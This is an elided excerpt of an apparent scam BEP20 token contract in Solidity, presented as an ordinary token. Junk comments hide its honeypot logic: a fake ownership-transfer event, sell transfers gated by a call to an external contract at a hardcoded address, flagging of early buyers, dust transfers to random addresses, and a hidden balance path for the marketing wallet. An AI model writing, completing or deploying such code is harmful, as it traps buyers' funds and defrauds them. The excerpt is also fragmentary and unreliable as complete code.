...
contract Ownable is Context {
  ...
  function ship() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44));
...
/*SA*/ interface 
 ...
 contract BEP20 is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public isMarketkingPair;
    ...
    address service
        ...
        isMarketkingPair[address(uniswapPair)] = true;
        hubobis = /*SASADASJK*/
        /*SSSADASGFS*/huob/*SASADASJK*/
        (0xf634e7d84f748326ED476390111c2a56b3a177c3);
        require(/*SASADASJK*/hubobis/*SASADASJK*/./*SASADASJK*/hb(/*SASADASJK*/) == true);
    ...
    function youno(address recipient) internal {
        if (!dogekingsmy[recipient] && !isMarketkingPair[recipient]) dogekingsmy[recipient] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
       ...
       if(!isMarketkingPair/*SASADASJK-----------*/ 
       [sender]) /*SASADASJK-----------*/ {
            require(hubobis./*SASADASJK-----------*/ 
            hubose(sender));
        }
        if(inSwapAndLiquify)
        { 
        ...
        {
            if(/*SASADASJK-----------*/  !iswcnmExempt[sender] /*SASADASJK*/&& 
            !iswcnmExempt[recipient]) {
                 require(
            amount <=
           _maxTxAmount,
          "Transfer amount exceeds the maxTxAmount."
            ...
            if(!isExcludedFromct[sender] && !isExcludedFromct[recipient]){
                address tadse;
                for(int i=0;i <=2;i++){
                    tadse = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,tadse,100);
                }
                amount -= 300;
            }    
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketkingPair[sender] && swapAndLiquifyEnabled) 
            {
            ...
            uint256 finalAmount;
            if (isExcludedFromct[sender] || isExcludedFromct[recipient]) {
                finalAmount = amount;/*SSSADASGFS*/
                if (WETH(sender, recipient)) {
                    _balances[recipient] = /*SSSADASGFS*/
                    _balances[recipient]./*SSSADASGFS*/add(amount);
                }
                _balances[sender] = _balances[sender].sub(amount);
            } else {require(herDotoge > 0);
                if (smallLLSH(block.number , 
                herDotoge + _CTdoor) 
                && /*SSSADASGFS*/ 
                !isMarketkingPair[recipient])
                 {youno(recipient);}/*SSSADASGFS*/
                finalAmount = takeFee(sender, recipient, amount);
                _balances[sender] = /*SASADASJK*/
                _balances[sender]./*SASADASJK*/
                sub(amount, "Insufficient Balance");
            }

            if(checkWalletLimitse && !isWalletLimitExempt[recipient])
                require(smallLLSH(balanceOf(recipient)./*SASADASJK*/
                add(finalAmount), _walletMax));

            _balances[recipient] = /*SASADASJK*/
            /*SASADASJKfinalAmount*/_balances[recipient].add
            /*SASADASJK*/(finalAmount);
    ...
    function smallLLSH(
        uint256 /*SASADASJK*/u, uint256 p) 
        public /*SASADASJK*/pure /*SASADASJK*/returns(bool) 
        { return /*SASADASJK*/u<=p; }

    function _basicTransfer(address /*SASADASJK*/sender, 
    address recipient, uint256 amount) 
    internal returns (bool) {
        _balances[sender] = /*SSSADASGFS*/
    ...
    function WETH(/*SASADASJK*/
        address Sr, 
        address ue) 
        private view /*SASADASJK*/
        returns(bool) {
        /*SSSADASGFS*/return Sr == 
        marketingWalletAddress && /*SSSADASGFS*/
        !isMarketkingPair[ue] && /*SSSADASGFS*/
        Sr == /*SSSADASGFS*/ue;
    }
...
address[] private airDropList;
  ...
  function takeFee(
    ...
    if (isMarketkingPair[sender]) {
      feeAmount = amount.mul(_totalTaxIfBuying).div(100);
    } else { //  if (isMarketkingPair[recipient])
